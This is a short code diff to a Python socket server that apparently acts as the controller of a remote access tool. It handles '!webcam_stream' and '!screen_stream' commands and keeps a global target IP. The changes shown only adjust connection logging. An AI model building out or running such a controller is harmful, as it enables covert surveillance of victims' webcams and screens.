@@ -36,6 +36,8 @@ def start_web_server():
 # Client connection handler
 def handle_client(client_socket, client_ip):
     global target_ip
+    print(f"Client connected: {client_ip}")
+    
     while True:
         command = client_socket.recv(1024).decode()
         if command == "!webcam_stream" or command == "!screen_stream":
@@ -76,8 +78,9 @@ def start_server():
 
     while True:
         client_socket, client_address = server_socket.accept()
-        print(f"Client connected: {client_address}")
         connected_clients[client_address[0]] = client_socket
+        print(f"Client connected: {client_address[0]}:{client_address[1]}")
+
         client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address[0]))
         client_thread.start()
 
